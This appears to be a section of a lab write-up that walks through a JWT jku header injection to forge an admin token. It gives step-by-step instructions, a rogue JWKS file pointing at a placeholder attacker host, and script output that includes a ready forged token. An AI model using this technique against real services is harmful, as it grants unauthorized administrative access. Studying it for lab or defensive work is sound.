## Node 06: The Remote Hijack (jku Header Attack)
The server fetches external keys based on the jku header without whitelisting allowed domains.

1. Generate an Asymmetric Keypair: Create your own RSA private/public keys.
2. Format as JWKS: Convert your public key into a JSON Web Key Set (JWKS) format.

```JSON
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "my-rogue-key",
      "n": "YOUR_PUBLIC_KEY_MODULUS..."
    }
  ]
}
```

3. Host the File: Upload this JSON file to a publicly accessible server (e.g., using ngrok or GitHub Pages). Let's assume the URL is https://example.com/jwks.json. (my case: https://www.writeup-db.com/demo-labs/jwks.json)

4. Forge the Token: Modify the initial token.
   - Header: Add your JKU URL and Key ID: "jku": "https://evil.com/jwks.json", "kid": "my-rogue-key".
   - Payload: Change to "role": "admin".

5. Sign the Token: Use a script or a tool like jwt.io (with RS256 selected) to sign this token using your own private key.
   
6. Submit: The server will read the jku, reach out to your evil.com server, download your public key, and use it to successfully validate the token you signed with your private key.


----
**Note**: Use exploit_node6.py for key genaration and payload generation:
- Run the script.
- Take the JSON output from Step 1 and overwrite your jwks.json file on writeup-db.com. Ensure the file is updated on the live server.
- Copy the newly generated Token string from Step 2.
- Submit that token to the Node 06 /admin endpoint.


**Result**:
```bash
> Generating fresh RSA keypair...

[STEP 1] -> Host this exact JSON at: https://www.writeup-db.com/demo-labs/jwks.json
--------------------------------------------------
{
  "keys": [
    {
      "kty": "RSA",
      "key_ops": [
        "verify"
      ],
      "n": "wW2PD6D5LhrX2MVdPlle5_E4JyzjGP8DedkN5BpI8Jl5qTXDplW_farpYN5dfIoZAcWEsdjbEwq269nE_SvibzOMXqMTCXhsCeV3T_mEJN2sHoyIpYRv4IwFQm_cyhRF1uZ6OvBpIN14lj58BuiQAhutp-jL-4etncJvwBM5Gu369CBV6luQuyhv8OBjYy-V6N5dMeDXCCpZhtl8uBeFLbOgkl-g463KPmeAlwNjne3064Htl-liWnpTSPmA9ETSiVnQknTEy1LKWMa83zmSVnb3myOaH6NEVEPQbyqjPOJFYOedGSto-CUXkGCjJmEXHdRq304PURKcQymB9ptFYw",
      "e": "AQAB",
      "kid": "rogue-key-01",
      "use": "sig"
    }
  ]
}
--------------------------------------------------

[STEP 2] -> Submit this Token to the /admin endpoint
--------------------------------------------------
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vd3d3LndyaXRldXAtZGIuY29tL2RlbW8tbGFicy9qd2tzLmpzb24iLCJraWQiOiJyb2d1ZS1rZXktMDEiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.e77ROhTopoXGLmSrrbqTZukKuFCgoDG_LJq_rM-H6UvPJejDGVEK9TG-raMca0JbtFwXYXH-qcWgFYWEnZnSSZgk-6qmIlr__EEe9wMfoC5VqyA_XnvR6qWAd1C708IIV7r6bqwAEkCjT8YpSnzk0y7OGy1hLbxImD6Xd9V2UsQk3x_mJAzqa84Pm5jJ6AfQfnTmv_thddZXcqB1Nzv5GnRppamICtQH24n6C_uNeG2ie0DfVoTzG7kVDWxOvrAjbh7sDwyBh_-_KIi6okPSJPwq9_tpeMHiu68I_J5wDmk28FVlBtsvgeyiqeXVz-VWJQIIlpLrvrlUTAtCc0gdjA
--------------------------------------------------
```
